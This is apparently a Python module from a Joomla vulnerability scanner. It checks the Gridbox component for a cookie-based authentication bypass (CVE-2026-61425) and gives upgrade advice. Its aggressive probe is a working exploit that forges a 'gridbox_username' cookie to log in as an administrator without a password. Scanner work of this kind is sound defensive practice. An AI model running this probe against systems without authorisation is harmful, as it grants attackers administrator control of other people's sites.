from __future__ import annotations

import re
from typing import Any

from ...core.args import aggressive_value
from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVECheckResult = Finding
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2026-61425"
NAME = "Gridbox gridbox_username cookie authentication bypass"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.0.2 (every release before 2.20.1)"
FIXED_RULE = "Gridbox 2.20.1 or later"
COOKIE_NAME = "gridbox_username"
PROFILE_PATH = "/index.php?option=com_users&view=profile&layout=edit"
ADMIN_CONFIG_PATH = "/index.php?option=com_config&view=config"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parsed < parse_version_required("2.20.1"):
        return "LIKELY_VULNERABLE"
    return "PATCHED"


def passive_result(plugins: dict | None) -> Finding:
    gridbox = (plugins or {}).get("gridbox", {})
    found = bool(gridbox.get("found"))
    version = gridbox.get("version")
    source = gridbox.get("source") or "unknown"
    if not found:
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM",
            component=COMPONENT, component_version=None, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Gridbox was not detected through its public component manifest or asset paths.",
            action="Component not detected via standard routes; verify manually if installed at another path.",
        )
    status = classify_version(version)
    confidence = "HIGH" if status in {"LIKELY_VULNERABLE", "PATCHED"} else "MEDIUM"
    details = {
        "LIKELY_VULNERABLE": (
            f"Gridbox {version} trusts the client-supplied gridbox_username cookie as an identity; "
            "verify live that one anonymous request logs the visitor in as the named account."
        ),
        "PATCHED": f"Gridbox {version} no longer turns the gridbox_username cookie into a session.",
        "INCONCLUSIVE": f"Gridbox was detected ({source}) but its version could not be determined.",
    }
    return Finding(
        cve=CVE_ID, name=NAME, status=status, confidence=confidence,
        component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=details[status],
        action="Upgrade Gridbox to 2.20.1 or later and audit administrator accounts for unauthorized logins.",
    )


def _profile_username(page: str) -> str | None:
    match = re.search(r'name="jform\[username\]"[^>]*value="([^"]*)"', page)
    return match.group(1) if match else None


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    admin_user: str = "admin",
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )

    guest_client = HttpClient(timeout=timeout, proxy=proxy)
    guest_config = guest_client.get(f"{base}{ADMIN_CONFIG_PATH}", timeout=timeout)
    guest_status = guest_config.get("status")

    attack_client = HttpClient(timeout=timeout, proxy=proxy)
    site = attack_client.get(
        f"{base}/", timeout=timeout,
        headers={"Cookie": f"{COOKIE_NAME}={admin_user}"},
    )
    if is_transport_error(site):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The forged-cookie request failed ({transport_error_detail(site)}).",
            action="Retry when the target is reachable.",
        )
    profile = attack_client.get(f"{base}{PROFILE_PATH}", timeout=timeout)
    identity = _profile_username(profile.get("body", "") or "")
    admin_page = attack_client.get(f"{base}{ADMIN_CONFIG_PATH}", timeout=timeout)
    admin_status = admin_page.get("status")
    evidence: dict[str, object] = {
        "cookie": COOKIE_NAME,
        "requested_identity": admin_user,
        "authenticated_identity": identity,
        "guest_admin_status": guest_status,
        "forged_admin_status": admin_status,
    }
    if identity == admin_user and admin_status == 200:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{ADMIN_CONFIG_PATH}",
            evidence=evidence,
            detail=(
                f"An anonymous request carrying only {COOKIE_NAME}={admin_user} produced a session "
                f"authenticated as {admin_user}: the profile edit form returned that username and the "
                f"administrator-only frontend config page answered HTTP 200 (guest baseline: {guest_status}). "
                "No password, session or token was supplied."
            ),
            action=(
                "Upgrade Gridbox to 2.20.1 or later, remove the gridbox_username cookie from clients, "
                "and audit administrator accounts and recent logins for unauthorized access."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{PROFILE_PATH}",
        evidence=evidence,
        detail=(
            "The forged gridbox_username cookie did not yield an authenticated session "
            f"(identity={identity!r}, admin config HTTP {admin_status})."
        ),
        action="Verify Gridbox runs 2.20.1 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only cookie login proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    admin_user = aggressive_value(aggressive_args, aggressive_command, "admin_user", "admin") or "admin"
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy, admin_user=admin_user,
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Authentication Bypass",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-61425",
            "https://mysites.guru/blog/gridbox-critical-authentication-bypass/",
        ],
    }
